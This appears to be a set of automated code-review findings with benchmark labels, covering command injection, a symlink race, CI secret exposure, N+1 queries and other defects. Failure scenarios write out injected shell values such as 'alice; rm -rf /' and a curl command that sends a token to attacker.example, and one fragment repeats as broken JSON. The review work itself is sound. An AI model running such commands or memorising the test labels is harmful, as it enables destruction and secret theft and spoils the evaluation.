findings.body: The change replaces a single batched repository call (repo.load_many(ids)) with a loop that calls repo.load(*id) once per input id. If repo.load performs a database query or network request, this introduces an N+1 access pattern whose cost scales linearly with the number of ids, and it also discards the batching that load_many previously provided. The original code was a single call; the new code is one call per element.
findings.failure_scenario: For a large ids slice, the function now issues one repository/database round-trip per id instead of one batched call, increasing latency and potentially exhausting the connection pool or database load.
findings.title: Replace per-id load with a batched load_many call

findings.body: Path containment is enforced by canonicalizing the candidate and running strip_prefix on it, but the file is then opened with a separate File::open call on the path string. The check and the open are not atomic: after strip_prefix succeeds, the directory entry can be replaced with a symlink pointing outside root, and File::open will follow it. This defeats the containment the change is trying to enforce. Use an atomic open such as openat2 with RESOLVE_BENEATH, or open the parent directory and use openat with O_NOFOLLOW, then verify the opened descriptor with fstat.
findings.failure_scenario: An attacker with write access to the parent directory swaps the verified candidate path for a symlink to an outside file between the strip_prefix check and File::open; File::open follows the symlink and returns a handle to an outside file, escaping the root restriction.
findings.title: Close TOCTOU race between containment check and file open

The check and the open are not atomic: after strip_prefix succeeds, the directory entry can be replaced with a symlink pointing outside root, and File::open will follow it. This defeats the containment the change is trying to enforce. Use an atomic open such as openat2 with RESOLVE_BENEATH, or open the parent directory and use openat with O_NOFOLLOW, then verify the opened descriptor with fstat.", "failure_scenario": "An attacker with write access to the parent directory swaps the verified candidate path for a symlink to an outside file between the strip_prefix check and File::open; File::open follows the symlink and returns a handle to an outside file, escaping the root restriction.", "suggestion": null, "anchor": "    File::open(candidate)", "anchored": false, "broad": false, "confidence": 7, "category": "correctness"}]

findings.body: The change builds a shell command by interpolating `user` into a string and runs it via `sh -c`. If `user` contains shell metacharacters (e.g., `;`, `&&`, backticks, `$()`), arbitrary commands execute. Previously the argument was passed as a separate argv element, avoiding shell interpretation. Use Process.run with a list of arguments, or escape/validate user. Remove the now-unused `command` variable on line 4.
findings.failure_scenario: If `user` is `alice; rm -rf /`, the shell executes `report --user alice; rm -rf /`, deleting files.
findings.title: Avoid shell interpolation of user input

findings.anchor: test('returns rows', () async => expect(await renderReport('alice', ['first', 'second']), isNotNull));
findings.body: The test used to assert that the output equals the input rows, which validated the spec criterion 'Rendering shall preserve every row'. It now only checks that the result is not null, so it passes even when the first row is dropped or when the shell invocation is used. Neither the 'preserve every row' requirement nor the 'no shell' requirement has any coverage after this change.
findings.title: Test no longer verifies the preservation requirement

findings.body: The spec requires that "Rendering shall preserve every row", but the change returns `rows.sublist(1)`, which always discards the first row. A renderer that previously emitted 'first', 'second' now emits only 'second'. On an empty input list, `sublist(1)` also throws a RangeError, so the function crashes instead of returning an empty list.
findings.failure_scenario: A caller invokes renderReport('alice', ['first', 'second']) and receives ['second']; with an empty rows list, the call throws RangeError (0 < 1) instead of returning a result, swallowing the report generation entirely.
findings.title: Return the full rows list; sublist(1) drops the first row

findings.body: The user-controlled `user` value is interpolated directly into a shell command string passed to `sh -c`. This is a command injection vulnerability: any shell metacharacters in `user` are interpreted by the shell. The previous code passed the argument as a list element, which is shell-safe. Revert to the argument-list form.
findings.failure_scenario: A caller passes user = "alice; rm -rf /" (or any value containing shell metacharacters), and the shell executes the injected command with the application's privileges, leading to arbitrary command execution.
findings.title: Use Process.run with an argument list, not shell interpolation

findings.body: The change replaces a single batched `repository.loadMany(ids)` call with a loop that issues one `repository.load(id)` query per ID, sequentially. If `ids` is derived from user input and is not bounded elsewhere, an attacker can pass a very large list and force many sequential database round-trips, exhausting database connections and CPU. Even without a malicious caller, the N+1 pattern is a performance regression versus the original batch load. If the caller or repository does not already cap the list size, add an explicit limit and reject or truncate oversized inputs.
findings.failure_scenario: An attacker supplies a request with a huge number of IDs; the server issues one blocking DB query per ID sequentially, tying up connections and degrading or denying service for other users.
findings.title: Bound the per-request ID count to prevent resource exhaustion

findings.anchor: (Map<String, Object?>, int) fetchUser(String id, int timeoutMs) {
findings.body: The commit message says 'keep fetchUser callers compatible', but this change makes fetchUser incompatible with every existing caller. The timeoutMs parameter changed from optional with a default (30000) to required, so calls like fetchUser('id') no longer compile. The return type also changed from Map<String, Object?> to a record (Map<String, Object?>, int), so callers that treat the result as a map break. This directly contradicts the stated intent.
findings.failure_scenario: Any existing caller that invokes fetchUser('id') without a timeout, or that uses the returned value as a Map, will fail to compile after this change, breaking the build.
findings.title: Keep fetchUser callers compatible by preserving the optional timeout and map return

findings.body: The previous contract returned a map with keys id, timeoutMs, and fetchedAt. The new return value is a record whose map only contains id and origin, and the timeout is moved to the record's second element. Callers that read result['timeoutMs'] or result['fetchedAt'] will now get null or a type error. This is a breaking change to the function's return contract, not just a refactor.
findings.failure_scenario: A caller that does final result = fetchUser('id', 5000); then reads result['timeoutMs'] will receive null (or fail to compile if the type is checked), because the map no longer contains that key.
findings.title: Preserve the map keys timeoutMs and fetchedAt in the return value

findings.body: The change adds an import of dart:html and uses window.location.origin, which ties this function to the web platform. If this library is used in a VM, Flutter mobile, or server context, the import will fail to compile or window will be undefined at runtime. The stated intent is a compatibility-preserving refactor, but this introduces a platform-specific dependency that is out of scope and may break non-web consumers.
findings.failure_scenario: If fetchUser is called from a non-browser environment (e.g., a Dart VM test or a Flutter mobile app), the import of dart:html causes a compile error, or window.location.origin throws at runtime, breaking the application.
findings.title: Avoid adding a dart:html dependency in a refactor meant to keep callers compatible

findings.body: Concatenating the user-supplied value into a /bin/sh -c command allows shell metacharacters in user to execute arbitrary commands. The previous ProcessBuilder form passed arguments without a shell and was safe. Use ProcessBuilder with separate arguments, or at minimum validate/escape user.
findings.failure_scenario: If user contains e.g. '; rm -rf /', the shell interprets it and executes the injected command, compromising the host.
findings.title: Use ProcessBuilder argument list to prevent command injection

findings.body: rows.subList(1, rows.size()) drops the first row and throws IndexOutOfBoundsException when rows is empty because fromIndex (1) exceeds toIndex (0). The stated intent is to preserve rows, so this is also a logic error. If skipping a header is intended, guard for empty and document it.
findings.failure_scenario: Calling render with an empty list throws IndexOutOfBoundsException; with a non-empty list the first row is silently lost, so the returned report is incomplete.
findings.title: Return all rows or guard against empty list

findings.body: The test was changed from asserting the exact returned rows to only assertNotNull. This no longer verifies the stated intent of preserving rows and would not catch the subList(1, ...) bug that drops the first row. Restore the equality assertion.
findings.failure_scenario: The method could return a list missing the first row and the test would still pass, allowing the regression to go unnoticed.
findings.title: Restore equality assertion to verify preserved rows

findings.body: The loop calls repository.load(id) once per id, replacing the previous single repository.loadMany(ids) call. If load() performs a database query or network round-trip per id, this is an N+1 pattern whose cost scales linearly with the number of ids. The original loadMany(ids) batched the work in one call.
findings.failure_scenario: When ids is large, each iteration issues its own query, multiplying latency and load on the repository/backend compared to the previous single batched loadMany call.
findings.title: Batch the repository loads to avoid N+1 queries

findings.title: Drop the ResultListFactory indirection

findings.anchor: var statement = db.prepareStatement("SELECT * FROM users WHERE id = ?");
findings.body: The PreparedStatement created here is never closed, and the method returns its ResultSet without exposing the statement to the caller. Every call to find() leaks a statement (and its server-side resources) until the connection is closed or the pool recycles it. Under repeated calls this exhausts database cursors/connections and degrades or stalls the application. The original code leaked a statement too, but this change introduces a new statement that is still never released. Because the ResultSet is returned, a simple try-with-resources around the statement would close it before the caller reads the rows, so the fix is structural: either close the statement after the ResultSet is fully consumed (e.g. return a wrapper or have the caller close it), or refactor so the statement is closed in a finally block once the rows are processed.
findings.failure_scenario: A caller invokes find() in a loop or under load; each invocation opens a PreparedStatement that is never closed, so the connection pool's open-statement/cursor limit is hit and subsequent queries fail or block.
findings.title: Close the PreparedStatement to avoid a resource leak

ground_truth.clean_trap: User-controlled text reaches a SQL operation only through PreparedStatement.setString, so it cannot alter query syntax.

findings.body: The change replaces a safe exec.Command call with an argument list with a shell invocation that interpolates the user string directly into a shell command. If user contains shell metacharacters (e.g. `; rm -rf /`, `$(...)`, backticks), they will be executed by the shell. This is a command injection vulnerability. The original code passed the user as a separate argument, which was safe. The new code is also functionally different: it now drops the first row from the returned slice (`rows[1:]`), which is a behaviour change not reflected in the function name or any documentation. The test was weakened to only check for nil, so the regression in row handling is not caught.
findings.failure_scenario: An attacker controls the `user` parameter (e.g. from a web form or CLI input). Passing `alice; touch /tmp/pwned` causes the shell to run `report --user alice` and then `touch /tmp/pwned`, executing arbitrary commands with the process's privileges.
findings.title: Command injection via shell interpolation of user input

findings.body: Slicing rows[1:] panics with 'slice bounds out of range' when rows is empty. The previous code returned rows unchanged, which handled the empty case gracefully. Additionally, this drops the first element of rows, which contradicts the stated intent to 'preserve report rows'.
findings.failure_scenario: Calling Render with an empty slice (or a slice with one element, which would then return an empty result) causes a panic at runtime, crashing the caller.
findings.title: Guard rows[1:] against empty input

findings.body: The test asserts `Render(...) == nil`, but since rows[1:] on a non-empty slice is never nil, this condition is always false and the test always passes. The test no longer verifies that the rows are preserved or that the output is correct — it would pass even if the function returned completely wrong data. The previous test checked the length and first element, which actually validated the output.
findings.failure_scenario: If a regression causes Render to return wrong data (e.g., dropping rows or returning garbage), the test still passes because it only checks for nil, giving false confidence in the change.

findings.body: The test was changed from asserting that Render preserves the input rows to only checking that the result is non-nil. The original test caught the rows[1:] regression; the new one does not.

findings.body: The new implementation calls repo.Load(id) for each id inside a loop, replacing the previous single repo.LoadMany(ids) call. This introduces an N+1 query pattern: one database query per id. If ids is large or attacker-controlled, this can cause excessive database load and a denial-of-service. Use LoadMany to fetch all items in one call and filter in Go.
findings.failure_scenario: An attacker supplies a large ids list; each id triggers a separate database query, exhausting the connection pool and slowing or crashing the service.
findings.title: Avoid per-item DB load to prevent N+1 query amplification

findings.body: This line reads defaults.json from the current working directory and discards both the data and any error. Nothing in FetchUser uses the result, so the read is dead code; it also introduces unnecessary filesystem I/O on every call and hides any failure. If defaults were intended to affect the result, they are never applied. If the line is removed, the added import "io/ioutil" should also be removed.
findings.failure_scenario: Every call to FetchUser performs an unnecessary untrusted disk read; a missing or mislocated defaults.json is silently swallowed and never affects the result, so the read is also misleading.

findings.anchor: func FetchUser(id string, timeout time.Duration) (User, time.Duration) {
findings.body: The commit message says this refactor preserves FetchUser caller compatibility, but the exported signature changes in a breaking way: the single return value becomes two, and the timeout parameter changes from *time.Duration to time.Duration. Existing callers that do `u := FetchUser(id, &timeout)` or rely on a single return value will not compile. The added second return value is just the input timeout, so it isn't even providing new behaviour.
findings.failure_scenario: Any existing caller using the old single-return form fails to compile, and any caller passing a *time.Duration no longer type-checks, breaking the build for every FetchUser call site.
findings.title: Restore original FetchUser signature to preserve caller compatibility

findings.body: The workflow is triggered by pull_request_target, so it runs on the base repository with its secrets available. The checkout step uses github.event.pull_request.head.sha, which is controlled by the PR author, and the following step runs `npm test` from that untrusted head. npm test executes package.json scripts (e.g. a `test` script, pretest/posttest hooks), which can be arbitrary code a PR author modifies. Putting RELEASE_TOKEN into the environment of that step makes the token readable by that arbitrary code, which can exfiltrate it. This is a secret-leak whenever the repo accepts contributions from forks or untrusted branches.
findings.failure_scenario: An attacker opens a PR that edits package.json to add a pretest/test script such as `curl -F token=$RELEASE_TOKEN https://attacker.example/x` or reads the env var directly. The workflow triggered by pull_request_target checks out that PR head and runs npm test with RELEASE_TOKEN in the environment, so the script executes and sends the token to the attacker.
findings.title: Expose RELEASE_TOKEN to untrusted pull_request_target code

findings.body: Switching the trigger to `pull_request_target` runs the workflow in the context of the base repository with access to repository secrets, but the added `ref: ${{ github.event.pull_request.head.sha }}` step checks out the PR author's untrusted code. This combination lets a malicious PR modify the workflow's own steps (e.g. the `npm test` step or the `RELEASE_TOKEN` env var) and exfiltrate the `RELEASE_TOKEN` secret. The checkout of the head SHA is precisely what defeats the isolation that `pull_request_target` is supposed to provide.
findings.failure_scenario: An attacker opens a PR that edits `.github/workflows/review.yml` (or any file the workflow runs) to print `$RELEASE_TOKEN` or send it to an external server. Because the trigger is `pull_request_target`, the workflow runs with the base repo's secrets, and because the checkout uses the head SHA, the malicious workflow file is the one executed, leaking the token.
findings.title: pull_request_target with checkout of head SHA exposes secrets to untrusted code

findings.body: The `ref: ${{ github.event.pull_request.head.sha }}` line is the direct cause of the secret-exposure risk: it checks out the PR author's code into the workflow that has access to `RELEASE_TOKEN`. Under `pull_request_target` the default checkout (the base branch) is safe; overriding it with the head SHA is not. If the intent is to run tests against the PR's code, the safe pattern is to run the untrusted code in a separate job that does not have secrets, or to use `pull_request` for the test job and keep `pull_request_target` only for trusted, non-checkout steps.
findings.failure_scenario: A PR author modifies the workflow file (or a script it invokes) to read `$RELEASE_TOKEN` and post it to a public gist. The `pull_request_target` trigger runs the modified workflow with the secret available, and the head-SHA checkout ensures the modified file is the one executed.
findings.title: Remove checkout of untrusted head SHA under pull_request_target

expected.label: pull_request_target executes untrusted head with a secret

findings.body: The change widens the admin security-group rule from the private RFC1918 range 10.20.0.0/16 to the whole internet (0.0.0.0/0) on TCP port 22 (SSH). This is a serious, easily-avoidable exposure: any host on the internet can now attempt SSH connections to the instance. Reducing the CIDR back to the original private range keeps the rule functional for internal administration while removing the attack surface.
